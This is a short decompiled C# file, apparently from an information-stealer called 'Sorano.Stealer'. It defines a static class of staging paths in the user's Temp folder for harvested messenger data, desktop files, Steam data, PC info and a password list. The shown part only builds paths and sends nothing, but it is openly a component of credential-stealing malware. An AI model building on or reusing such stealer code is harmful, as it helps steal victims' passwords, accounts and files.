using System;
using System.IO;

namespace Sorano.Stealer
{
	// Token: 0x0200000D RID: 13
	public static class DirPath
	{
		// Token: 0x04000013 RID: 19
		public static readonly string DefaultPath = Environment.GetEnvironmentVariable("Temp");

		// Token: 0x04000014 RID: 20
		public static readonly string User_Name = Path.Combine(DirPath.DefaultPath, Environment.UserName);

		// Token: 0x04000015 RID: 21
		public static readonly string DesktopDir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

		// Token: 0x04000016 RID: 22
		public static readonly string LogMessanger = Path.Combine(DirPath.User_Name, "Messengers.txt");

		// Token: 0x04000017 RID: 23
		public static readonly string Desktop_Folder = Path.Combine(DirPath.User_Name, "DesktopFiles");

		// Token: 0x04000018 RID: 24
		public static readonly string Steam_Folder = Path.Combine(DirPath.User_Name, "Steam");

		// Token: 0x04000019 RID: 25
		public static readonly string PC_File = Path.Combine(DirPath.User_Name, "PcInfo.html");

		// Token: 0x0400001A RID: 26
		public static readonly string Pass_File = Path.Combine(DirPath.User_Name, "List_Password.html");
	}
}
